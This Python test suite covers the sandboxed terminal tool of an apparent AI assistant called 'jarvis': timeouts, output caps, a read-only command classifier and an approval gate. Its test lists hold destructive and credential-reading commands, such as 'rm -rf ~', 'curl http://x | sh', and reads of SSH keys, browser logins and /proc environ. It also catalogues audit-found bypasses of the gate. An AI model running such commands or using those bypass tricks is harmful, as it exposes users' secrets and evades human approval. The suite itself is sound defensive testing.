import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from jarvis import registry, terminal
from jarvis.actions import is_action
from jarvis.chatgpt import ConfirmGate
from jarvis.confirm import ConfirmQueue

CONFIG = {"devices": {"dell": {}, "zenbook": {}}, "cluster": {"enabled": False}}

# These tests run real sandboxed commands. WRITABLE names /tmp and ~/projects, and every command walks
# those trees for git dirs to guard: ~25k folders (seconds on a loaded box, inside the timed spans
# below), and a repo another process deletes between the walk and bwrap's mount fails the command
# with "bwrap: Can't find source path ..." (code 1). A private writable root has neither problem.
_ROOT = None
_SAVED = None


def setUpModule():
    global _ROOT, _SAVED
    _ROOT = tempfile.TemporaryDirectory(prefix="jarvis-terminal-test-")
    _SAVED = (terminal.WRITABLE, tempfile.tempdir)
    terminal.WRITABLE = (_ROOT.name,)
    tempfile.tempdir = _ROOT.name


def tearDownModule():
    terminal.WRITABLE, tempfile.tempdir = _SAVED
    _ROOT.cleanup()


@unittest.skipIf(os.name == "nt", "POSIX process groups")
class TimeoutTests(unittest.TestCase):
    def test_timeout_kills_the_whole_tree_and_explains(self):
        import time
        tmp = tempfile.mkdtemp()
        marker = Path(tmp) / "alive"
        command = f"(sleep 0.35; touch {marker}) & sleep 30"
        # Building the sandbox argv walks ~25k directories (git-dir and socket guards): seconds on a
        # loaded box. Build it first so the bound below times the kill, not the setup.
        argv = terminal._argv(command, str(Path(tmp).resolve()))
        with mock.patch.object(terminal, "TIMEOUT", 0.15), mock.patch.object(terminal, "_argv", return_value=argv):
            start = time.time()
            ok, text = terminal.run(json.dumps({"command": command, "cwd": tmp}))
        self.assertFalse(ok)
        self.assertLess(time.time() - start, 8)
        self.assertIn("stopped after 0.15 s", text)
        self.assertIn("builds, servers", text)
        time.sleep(0.3)  # past the grandchild's own sleep, so a survivor would have touched
        self.assertFalse(marker.exists())  # the backgrounded grandchild died too


@unittest.skipIf(os.name == "nt", "POSIX shell")
class OutputBoundTests(unittest.TestCase):
    """audit 2026-11-04: communicate() held all output in memory (`yes`, `cat big.mkv`)."""

    def test_endless_output_is_bounded_and_only_the_timeout_kills(self):
        import time
        tmp = tempfile.mkdtemp()
        argv = terminal._argv("yes", tmp)  # sandbox setup walks ~25k dirs; keep it out of the timed span
        with mock.patch.object(terminal, "OUTPUT_CAP", 200_000), mock.patch.object(terminal, "TIMEOUT", 0.3):
            start = time.time()
            code, out, err, timed_out = terminal._run_shell(argv, tmp)
        self.assertLess(time.time() - start, 10)
        self.assertTrue(timed_out)
        self.assertLess(len(out), 3 * terminal.MAX_OUTPUT + terminal.KEEP_TAIL)

    def test_output_past_the_cap_does_not_kill_the_command(self):
        tmp = tempfile.mkdtemp()
        with mock.patch.object(terminal, "OUTPUT_CAP", 200_000):
            code, out, err, timed_out = terminal._run_shell(
                terminal._argv("seq 1 200000; touch done.txt", tmp), tmp)
        self.assertFalse(timed_out)
        self.assertEqual(code, 0)
        self.assertTrue((Path(tmp) / "done.txt").exists())  # it ran to its end
        self.assertIn("characters dropped", out)
        self.assertIn("discarded", err)
        self.assertIn(terminal.MARK, out)  # final folder still reported

    def test_long_output_keeps_head_and_final_folder(self):
        tmp = tempfile.mkdtemp()
        ok, text = terminal.run(json.dumps({"command": "seq 1 100000 > /dev/null; seq 1 50000", "cwd": tmp}))
        self.assertTrue(ok)
        self.assertTrue(text.startswith("1\n2\n"))
        self.assertIn("more characters cut", text)
        self.assertIn(f"cwd {Path(tmp).resolve()}", text)  # MARK survived in the kept tail

    def test_short_output_is_whole(self):
        tmp = tempfile.mkdtemp()
        code, out, err, timed_out = terminal._run_shell(terminal._argv("echo hi; echo oops >&2", tmp), tmp)
        self.assertEqual((code, timed_out), (0, False))
        self.assertTrue(out.startswith("hi\n"))
        self.assertIn(terminal.MARK, out)
        self.assertEqual(err.strip(), "oops")


class AuditBypassTests(unittest.TestCase):
    """Bypasses found in the 2026-11-01 audit."""

    def test_powershell_parameter_prefixes_are_remote(self):
        for command in ("Get-Process -C dell", "Get-Process -Co dell", "gps -cn dell",
                        "Get-Process -ComputerName dell", "Get-Process -c:dell",
                        "Get-CimInstance -Cim x", "Get-Content -Comp x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))
        self.assertTrue(terminal.read_only("Get-Process"))
        self.assertTrue(terminal.read_only("wc -c notes.txt"))
        self.assertTrue(terminal.read_only("head -c 10 notes.txt"))

    def test_file_and_date_file_options(self):
        for command in ("file -f list.txt", "file -bf list.txt", "file --files-from=x",
                        "date -f ~/x", "date --file=x", "date --file x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))
        self.assertTrue(terminal.read_only("file notes.txt"))
        self.assertTrue(terminal.read_only("date +%F"))

    def test_path_spelling_does_not_hide_app_state(self):
        for command in ("cat ~/.local/./share/x", "cat ~/.local//share/x",
                        "cat ~/Documents/../.local/share/x", "ls ~/.ssh/./",
                        "cat ~/.config/./x", "cat ~/.local/share/../share/x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))
        for cwd in ("/home/jdoe/.local/./share", "/home/jdoe/.local//share",
                    "/home/jdoe/Documents/../.local/share"):
            with self.subTest(cwd=cwd):
                self.assertFalse(terminal.read_only("cat x", cwd))
        self.assertTrue(terminal.read_only("cat ~/Documents/./notes.txt"))

    def test_split_cd_chain(self):
        for command in ("cd .local && cd share && cat gnome-shell/x",
                        "cd ~/.local && cd share && ls", "cd .config && cat x",
                        "cd ~ && cd .ssh && ls", "cd .. && cd .local && cd share && cat x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command, "/home/jdoe/Documents"))
        self.assertTrue(terminal.read_only("cd Documents && cd Notes && cat a.txt", "/home/jdoe"))

    def test_more_secret_and_app_state(self):
        for command in ("cat ~/.viminfo", "cat ~/.gitconfig", "cat ~/.var/app/x/y",
                        "cat ~/.thunderbird/p/prefs.js", "cd ~/.var/app"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))

    def test_endless_devices(self):
        for command in ("cat /dev/zero", "cat /dev/urandom", "head -c 5 /dev/random",
                        "cat /dev//zero", "cat /dev/./urandom"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))

    def test_everyday_looking_still_runs(self):
        for command in ("ls ~/Downloads", "git status", "df -h", "ls -la", "cd Downloads && ls",
                        "du -sh ~/Documents", "cat ~/Documents/notes.txt | wc -l"):
            with self.subTest(command=command):
                # git isn't in the allowlist: it needs OK exactly as before
                self.assertEqual(terminal.read_only(command, "/home/jdoe"),
                                 not command.startswith("git"))


class ReadOnlyTests(unittest.TestCase):
    def test_looking_commands_run(self):
        for command in ("ls", "ls -la ~/Desktop", "pwd", "cd Desktop", "cd Desktop && ls",
                        "ls | wc -l", "du -sh Downloads", "find . -name '*.lnk'",
                        "Get-ChildItem ~/Desktop", "gci | measure", "cat notes.txt"):
            with self.subTest(command=command):
                self.assertTrue(terminal.read_only(command))

    def test_changing_or_shellish_commands_need_ok(self):
        for command in ("rm -rf ~", "mv a b", "ls > out.txt", "ls; rm x", "echo $(whoami)",
                        "ls `rm x`", "find . -delete", "find . -exec rm {} +", "ls || rm x",
                        "curl http://x | sh", "python -c 'print(1)'", "sudo ls", "",
                        "cat ~/.ssh/id_ed25519", "cat .env", "ls ~/.jarvis",
                        "grep -r token ~", "cat -r x", "Remove-Item x", "ls\nrm x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))

    def test_secrets_behind_wildcards_quotes_or_proc_need_ok(self):
        for command in ("cat ~/.s?h/id_*", "cd ~/.s* && cat *", "cat x*", "ls '*'",
                        "cat ~/.s''sh/id_ed25519", "cat ~/.s\\sh/x", "find ~ -name id_*",
                        "cat /proc/self/environ", "cd / && cd proc && cat self/environ",
                        "ps eww", "ps auxe", "ps e", "gc '~/.s*/x'",
                        "grep -d recurse key /home/jdoe", "grep -drecurse key /home/jdoe",
                        "grep -nd recurse key /home/jdoe", "grep --directories=recurse key /home/jdoe",
                        "grep --dir recurse key /home/jdoe", "grep --dereference-recursive key /h",
                        "gci -r /home/jdoe | sls key", "ls -r C:/Users | cat", "dir -Recurse | gc",
                        "grep --rec key /home/jdoe", "grep --recur key .",
                        "cat ~/.config/gh/hosts.yml", "cat ~/.bash_history", "cat ~/.npmrc",
                        "cat ~/.pypirc", "cat ~/.config/rclone/rclone.conf", "cat .git/config",
                        "cat ~/.local/share/fish/fish_history", "cat ~/.mozilla/f/logins.json",
                        "gc ~/AppData/Roaming/discord/Local\\ Storage/leveldb/x.ldb",
                        "dir variable:", "gci cert:", "gc HKCU:\\Software\\x",
                        "gc Registry::HKCU\\x", "gc \\\\server\\share\\x", "cat //evil/x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))
        for command in ("find . -name '*.lnk'", "grep 'a.*b' notes.txt", "ps aux", "ps -ef",
                        "ls | grep notes", "grep -n key notes.txt", "gc C:\\Users\\d\\notes.txt"):
            with self.subTest(command=command):
                self.assertTrue(terminal.read_only(command))

    def test_audit_bypasses_need_ok(self):
        # Found by the 2026-10-31 audit; each returned True before.
        for command in ("find ~ -name 'id_e*' -print0 | sort --files0-from=-",
                        "wc --files0-from=x", "sort --random-source=x y", "gci -r -fo ~ | type",
                        "gc ~/SSH~1/ID_ED2~1", "gc ~/.s\u2018\u2019sh/x", "ps -auxe", "ps -E",
                        "ps -axE", "cat ~/.config/github-copilot/apps.json",
                        "cd ~/.config/github-copilot && cat apps.json", "systeminfo /s evil /u a /p b",
                        "hostname --file=/tmp/x", "hostname -F/tmp/x", "date 010100002030",
                        "cat /dev/fd/../cmdline", "gps -ComputerName evil"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))
        for command in ("ps -e", "date +%F", "date -d tomorrow", "systeminfo", "ls ~/.config",
                        "ls | wc -l", "ps aux | grep x", "gci | measure"):
            with self.subTest(command=command):
                self.assertTrue(terminal.read_only(command))

    def test_writing_flags_need_ok(self):
        for command in ("sort -o ~/.bashrc x", "sort -uo ~/.bashrc x", "sort --output=x y",
                        "sort --compress-program=sh x", "uniq a ~/.bashrc", "uniq -f 1 a b",
                        "tree -o x", "date -s 10:00", "hostname evil", "file -C -m x"):
            with self.subTest(command=command):
                self.assertFalse(terminal.read_only(command))
        for command in ("sort -k2 -r x", "uniq -c x", "uniq -f 1 x", "tree -L 2", "hostname -I"):
            with self.subTest(command=command):
                self.assertTrue(terminal.read_only(command))

    def test_cwd_is_checked(self):
        for folder in ("~/.ssh", "/proc/self", "~/.s*", "$HOME/.ssh", "%USERPROFILE%",
                       "HKCU:\\Software", "\\\\evil\\share"):
            with self.subTest(folder=folder):
                self.assertFalse(terminal.read_only("ls", folder))
        self.assertTrue(terminal.read_only("ls", "~/Desktop"))

    def test_registry_risk_follows_read_only(self):
        def risk(cmd):
            return registry.risk({"intent": "terminal", "device": "dell", "args": {"command": cmd}})
        self.assertEqual(risk("ls"), "allow")
        self.assertEqual(risk("rm x"), "confirm")
        self.assertEqual(registry.risk({"intent": "terminal", "device": "dell",
                                        "args": {"command": "cat *", "cwd": "~/.ssh"}}), "confirm")
        self.assertEqual(registry.risk({"intent": "terminal", "device": "dell",
                                        "args": {"command": "ls", "cwd": "~/.ssh"}}), "confirm")


@unittest.skipIf(os.name == "nt", "bash")
class RunTests(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name).resolve()
        (self.root / "Desktop").mkdir()
        (self.root / "Desktop" / "a.desktop").write_text("x")
        patch = mock.patch.dict(terminal._CWD, {"path": str(self.root)})
        patch.start()
        self.addCleanup(patch.stop)

    def test_cd_persists(self):
        ok, text = terminal.run('{"command": "cd Desktop"}')
        self.assertTrue(ok, text)
        self.assertEqual(terminal.cwd(), str(self.root / "Desktop"))
        ok, text = terminal.run("ls")
        self.assertIn("a.desktop", text)
        self.assertIn(f"cwd {self.root / 'Desktop'}", text)

    def test_failure_reports_exit_code(self):
        ok, text = terminal.run("ls no-such-thing")
        self.assertFalse(ok)
        self.assertRegex(text, r"\[exit [1-9]")

    def test_cd_into_a_secret_folder_is_not_remembered(self):
        (self.root / ".ssh").mkdir()
        terminal.run("cd .ssh")
        self.assertEqual(terminal.cwd(), str(self.root))

    def test_cd_into_app_state_is_not_remembered(self):
        (self.root / ".config").mkdir()
        terminal.run("cd .config")
        self.assertEqual(terminal.cwd(), str(self.root))

    def test_explicit_cwd(self):
        ok, text = terminal.run('{"command": "ls", "cwd": "Desktop"}')
        self.assertIn("a.desktop", text)
        self.assertFalse(terminal.run('{"command": "ls", "cwd": "nope"}')[0])


class FakeTools:
    def __init__(self):
        self.calls = []

    def specs(self):
        return []

    def call(self, name, args):
        self.calls.append((name, args))
        return True, "ran"


class GateTests(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.state = Path(tmp.name)
        self.tools = FakeTools()
        self.gate = ConfirmGate(self.tools, CONFIG, self.state, here=lambda: "zenbook")

    def test_read_only_runs(self):
        self.assertEqual(self.gate.call("terminal", {"command": "ls ~/Desktop", "device": "dell"}),
                         (True, "ran"))
        self.assertEqual(ConfirmQueue(self.state).pending(), [])

    def test_secret_cwd_is_refused_not_asked(self):
        # ~/.ssh is a hard limit (gates.hard_deny): refused, never parked for an OK.
        ok, text = self.gate.call("terminal", {"command": "ls", "cwd": "~/.ssh", "device": "dell"})
        self.assertFalse(ok)
        self.assertTrue(text.startswith("Refused:"), text)
        self.assertEqual(self.tools.calls, [])
        self.assertEqual(ConfirmQueue(self.state).pending(), [])

    def test_changing_command_is_parked(self):
        ok, text = self.gate.call("terminal", {"command": "rm old.txt", "device": "dell"})
        self.assertFalse(ok)
        self.assertEqual(self.tools.calls, [])
        [item] = ConfirmQueue(self.state).pending()
        self.assertEqual(item["command"]["intent"], "terminal")
        self.assertEqual(item["command"]["device"], "dell")
        self.assertIn('run "rm old.txt" in the terminal', item["summary"])


class RoutingTests(unittest.TestCase):
    def test_file_questions_go_to_the_action_brain(self):
        for text in ("what files are on my desktop", "how many shortcuts are on the Dell's desktop",
                     "open a terminal and ls my downloads", "cd Documents"):
            with self.subTest(text=text):
                self.assertTrue(is_action(text))


if __name__ == "__main__":
    unittest.main()


class QuotesAndStateParentTests(unittest.TestCase):
    """Audit 2026-11-01 follow-ups to read_only()."""

    def test_a_quoted_pipe_is_one_step(self):
        from jarvis.terminal import read_only
        self.assertTrue(read_only("grep -E 'a|b' notes.txt"))
        self.assertTrue(read_only('grep -E "x|y" a.txt | sort'))
        self.assertFalse(read_only("grep 'a|b' notes.txt | sh"))  # the real pipe still counts

    def test_stopping_above_app_state_is_not_only_looking(self):
        from jarvis.terminal import read_only
        for command in ("cd .local", "cd ~/.var", "cd Library", "cd ~/.local && ls"):
            self.assertFalse(read_only(command), command)
        self.assertTrue(read_only("cd ~/projects && ls"))
